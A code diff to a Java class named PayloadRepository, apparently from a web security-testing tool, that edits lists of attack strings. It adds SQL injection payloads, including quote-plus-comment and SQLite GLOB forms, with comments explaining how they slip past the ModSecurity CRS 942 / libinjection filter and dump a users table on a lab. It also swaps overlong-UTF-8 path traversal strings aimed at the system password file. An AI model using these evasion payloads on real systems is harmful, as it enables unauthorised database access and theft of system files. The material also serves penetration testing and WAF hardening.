@@ -48,17 +48,21 @@ public class PayloadRepository {
     // the backend to normalise the obfuscation (double-decode, overlong UTF-8, key-trim).
     // Re-test any edit against a live block page before relying on it.
 
-    // index 0..2 land on any SQL engine (-- is the universal comment; confirmed dumping the
-    // admin row on the lab's SQLite). #-comment entries are MySQL/MariaDB-only. Last entry
-    // needs the app to URL-decode twice.
+    // CRS 942 is libinjection-backed: quote + OR/UNION/AND/= is caught, but quote + comment,
+    // or quote + a rarer operator libinjection doesn't fingerprint (GLOB), is not.
+    //   idx 0-1  quote+comment auth-bypass, any engine (-- universal); confirmed on the lab.
+    //   idx 2-3  GLOB '*' — SQLite boolean-true; both bypass libinjection AND dump the users
+    //            table on the lab. idx 3 even survives a leading OR.
+    //   idx 4-6  MySQL/MariaDB # comment.
+    //   idx 7    needs the app to URL-decode twice.
     public static final List<String> SQLI_EVASION = Arrays.asList(
         "admin'-- -",
         "admin' -- ",
+        "admin' glob '*'-- -",
+        "1' or id glob '*'-- -",
         "admin'/**/-- -",
         "admin'--+-",
         "admin' #",
-        "admin'#",
-        "admin'`#",
         "%2527%20OR%25201=1"
     );
 
@@ -88,8 +92,8 @@ public class PayloadRepository {
         "..%25c0%25afetc%25c0%25afpasswd",
         "..%c0%afetc%c0%afpasswd",
         "%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
-        "..%e0%80%afetc%e0%80%afpasswd",
-        "..%c1%9cetc%c1%9cpasswd"
+        "....%c0%afetc%c0%afpasswd",
+        "..%e0%80%afetc%e0%80%afpasswd"
     );
 
     // Index 0 combines a command separator with quote-insertion (shell still parses i""d as
